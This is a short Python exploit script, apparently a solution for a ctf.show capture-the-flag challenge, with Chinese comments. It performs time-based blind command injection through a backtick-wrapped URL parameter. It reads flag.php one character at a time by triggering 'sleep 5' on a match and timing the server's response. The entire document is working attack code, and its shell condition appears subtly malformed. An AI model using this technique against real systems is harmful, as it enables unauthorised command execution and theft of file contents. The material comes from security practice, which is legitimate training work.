import requests
import time as t
from urllib.parse import quote as urlen

# 目标URL
url = 'http://8a7682f7-4743-40c2-a153-0cc87188ec98.challenge.ctf.show/?F=`$F%20`;'

# 定义可能的字符集
alphabet = ['{', '}', '.', '@', '-', '_', '=', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k', 'l', 'm', 'n',
            'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I',
            'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3',
            '4', '5', '6', '7', '8', '9']

# 初始化结果字符串
result = ''

# 遍历可能的字符位置
for i in range(1, 60):
    for char in alphabet:
        # 构造payload，检查flag.php文件中的字符
        payload = "if [ cat flag.php | grep 'flag' | cut -c{} = '{}' ];then sleep 5;fi".format(i, char)

        # 构造请求数据
        data = {'cmd': payload}

        try:
            # 记录请求开始时间
            start = int(t.time())

            # 发送GET请求
            r = requests.get(url + urlen(payload))

            # 计算请求耗时
            end = int(t.time()) - start

            # 如果耗时超过3秒，说明字符匹配成功
            if end >= 3:
                result += char
                print("Flag: " + result)
                break
        except Exception as e:
            # 打印异常信息
            print(e)